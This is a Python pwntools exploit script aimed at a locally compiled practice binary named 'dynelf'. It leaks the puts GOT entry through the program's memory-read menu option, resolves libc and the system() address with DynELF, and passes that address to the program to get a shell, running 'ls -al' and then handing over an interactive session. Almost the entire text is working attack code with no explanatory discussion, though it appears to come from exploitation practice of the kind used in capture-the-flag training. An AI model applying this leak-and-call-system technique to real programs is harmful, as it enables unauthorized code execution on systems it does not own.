#!/usr/bin/env python
from pwn import *
import pwnlib.dynelf as dynelf
print("""
gcc -o dynelf dynelf.c
""")

p = process('./dynelf')
elf = ELF('./dynelf')

context.log_level = 'debug'
context.arch = 'amd64'

p.recvuntil('main(): ')
main_addr = int(p.recvline(), 16)
log.info('main_addr: ' + hex(main_addr))

def send_addr(addr):
    p.sendlineafter('> ', '1')
    p.sendlineafter(':', hex(addr))
    p.recvuntil('!')
    result = p.recv(4)
    log.info('result: ' + str(result))
    p.recvuntil('!')
    return result

def leak_func(addr):
    log.info('leak_func addr: ' + hex(addr))
    return send_addr(addr)

puts_got = main_addr - elf.symbols['main'] + elf.got['puts']

libc_hi_addr = send_addr(puts_got)
libc_lo_addr = send_addr(puts_got + 4)

libc_addr = u64(libc_hi_addr + libc_lo_addr)
log.info('libc_addr: ' + hex(libc_addr))

d = DynELF(leak_func, main_addr, elf=elf)

log.info(hex(d.lookup(None, 'libc')))
input("continue")

d = DynELF(leak_func, libc_addr)
system_addr = None
try:
    system_addr = d.lookup("system", 'libc')
except Exception as e:
    print("==========")
    print("if you get a error, see the issue:\n\t# https://github.com/Gallopsled/pwntools/issues/1951")
    print("\tresult = e.symbols[symb.decode()]")
    print("==========")
    log.info(e)
    exit(1)

log.info(hex(system_addr))

p.sendlineafter('> ', '2')
p.sendlineafter(':', hex(system_addr))

p.sendline("ls -al")
p.interactive()



